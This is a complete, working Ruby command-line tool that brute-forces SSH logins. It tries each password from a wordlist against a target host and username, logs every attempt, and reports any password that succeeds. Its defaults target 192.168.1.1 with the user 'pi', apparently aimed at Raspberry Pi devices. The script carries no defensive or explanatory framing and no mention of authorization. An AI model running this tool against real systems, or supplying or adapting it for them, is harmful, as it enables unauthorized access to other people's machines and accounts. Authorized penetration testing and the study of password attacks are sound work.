require 'net/ssh'
require 'optparse'

# Configuration
options = {}
OptionParser.new do |opts|
  opts.banner = "Usage: ssh_brute_force.rb [options]"

  opts.on("-t", "--target HOST", "Target host (IP or hostname)") do |t|
    options[:host] = t
  end

  opts.on("-u", "--user USERNAME", "Username to brute force") do |u|
    options[:username] = u
  end

  opts.on("-w", "--wordlist FILE", "Path to the password wordlist") do |w|
    options[:password_list] = w
  end

  opts.on("-l", "--log FILE", "Path to the log file") do |l|
    options[:log_file] = l
  end

  opts.on("-p", "--port PORT", "Port (default 22)", Integer) do |p|
    options[:port] = p
  end
end.parse!

# Set default values
host = options[:host] || '192.168.1.1'
username = options[:username] || 'pi'
password_list = options[:password_list] || 'passwords.txt'
log_file = options[:log_file] || 'brute_force.log'
port = options[:port] || 22

# Function to attempt SSH connection
def ssh_brute_force(host, port, username, password_list, log_file)
  # Check if the password list file exists
  unless File.exist?(password_list)
    log_message(log_file, "[!] Password list file not found: #{password_list}")
    return nil
  end

  total_passwords = File.foreach(password_list).count
  current_password = 0

  File.foreach(password_list) do |line|
    current_password += 1
    password = line.strip
    next if password.empty? # Skip empty lines

    progress = (current_password.to_f / total_passwords * 100).round(2)
    log_message(log_file, "[*] Progress: #{progress}% (#{current_password}/#{total_passwords})")
    log_message(log_file, "[*] Trying: #{username}:#{password}")

    begin
      Net::SSH.start(host, username, password: password, port: port, timeout: 5) do |_ssh|
        success_message = "[+] Success! Password found: #{password}"
        log_message(log_file, success_message)
        return password
      end
    rescue Net::SSH::AuthenticationFailed
      log_message(log_file, "[-] Incorrect password: #{password}")
    rescue Net::SSH::Exception, Net::SSH::ConnectionTimeout => e
      log_message(log_file, "[!] Connection error: #{e.message}")
      return nil
    rescue StandardError => e
      log_message(log_file, "[!] Unexpected error: #{e.message}")
      return nil
    end
  end

  log_message(log_file, "[-] Password not found.")
  nil
end

# Helper function to log messages
def log_message(log_file, message)
  timestamp = Time.now.strftime("%Y-%m-%d %H:%M:%S")
  formatted_message = "[#{timestamp}] #{message}"
  begin
    File.open(log_file, 'a') do |log|
      log.puts(formatted_message)
    end
  rescue => e
    puts "[!] Failed to write to log file: #{e.message}"
  end
  puts formatted_message
end

# Main execution
puts "=== SSH Brute Force ==="
found_password = ssh_brute_force(host, port, username, password_list, log_file)

if found_password
  puts "[+] Found password: #{found_password}"
else
  puts "[-] Brute force completed unsuccessfully."
end
